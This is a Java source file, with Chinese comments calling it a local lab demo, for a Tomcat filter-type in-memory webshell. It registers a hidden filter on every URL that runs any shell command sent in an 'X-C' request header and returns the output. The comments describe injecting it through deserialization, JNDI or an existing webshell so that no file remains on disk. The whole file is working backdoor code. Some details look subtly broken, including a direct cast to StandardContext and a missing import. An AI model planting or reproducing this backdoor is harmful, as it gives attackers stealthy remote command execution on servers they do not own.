import javax.servlet.*;
import org.apache.catalina.core.StandardContext;
import java.io.*;

// Tomcat Filter 型内存马 demo（本地实验环境）：向运行中 StandardContext 注册动态 Filter
// 触发方式：经反序列化/JNDI/初始 webshell 执行本段（注入后落地文件可删）；命令走 Header
public class FilterShell {
    public static void inject(ServletContext ctx) throws Exception {
        StandardContext sc = (StandardContext) ctx;
        FilterRegistration.Dynamic f = sc.addFilter("k", new Filter() {
            public void doFilter(ServletRequest req, ServletResponse res, FilterChain ch)
                    throws IOException, ServletException {
                HttpServletRequest r = (HttpServletRequest) req;
                String cmd = r.getHeader("X-C");
                if (cmd != null) {
                    Process p = Runtime.getRuntime().exec(cmd);
                    res.getWriter().write(new String(p.getInputStream().readAllBytes()));
                    return;
                }
                ch.doFilter(req, res);
            }
        });
        f.setUrlPatterns(java.util.Arrays.asList("/*"));
        sc.filterStart();
    }
}
